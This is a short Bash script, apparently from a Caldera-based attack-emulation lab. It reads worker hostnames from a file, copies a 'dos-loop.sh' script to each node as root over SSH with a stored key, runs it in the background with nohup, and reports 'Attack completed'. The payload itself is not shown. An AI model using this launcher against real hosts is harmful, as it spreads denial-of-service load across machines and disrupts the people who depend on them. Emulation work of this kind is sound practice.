#!/usr/bin/env bash
set -euo pipefail

FILE_IP="$DATA_PATH/KC5/iphost"
KEY_PATH="$DATA_PATH/KC5/ssh/ssh-key"

list_node_hostnames() {
  if [[ ! -f "$FILE_IP" ]]; then
    echo "Errore: file '$FILE_IP' non trovato" >&2
    return 1
  fi

  echo ">> Recupero lista IPs (da file: $FILE_IP)..." >&2

  # raccogliamo e stampiamo alla fine per poter fare sort -u
  grep -E '[-]' "$FILE_IP" \
   | cut -d'-' -f2- \
   | sed -E 's/^[[:space:]]+|[[:space:]\r]+$//g' \
   | grep worker \
   | cut -d'.' -f1 \
   | sort -u
}

mapfile -t nodes < <(list_node_hostnames | sed '/^$/d')
if [[ "${#nodes[@]}" -eq 0 ]]; then
  echo "Nessun nodo trovato."; exit 1
fi
echo ">> Nodi trovati (${#nodes[@]}): ${nodes[*]}"
for n in "${nodes[@]}"; do
    scp -P 2222 -i "$KEY_PATH" /opt/caldera/common/dos-loop.sh root@"$n":/tmp/dos-loop.sh
    ssh -p 2222 -i "$KEY_PATH" root@"$n" \
      'nohup bash /tmp/dos-loop.sh </dev/null >/var/log/dos-loop.log 2>&1 &'
    echo "Attack completed for $n"
done
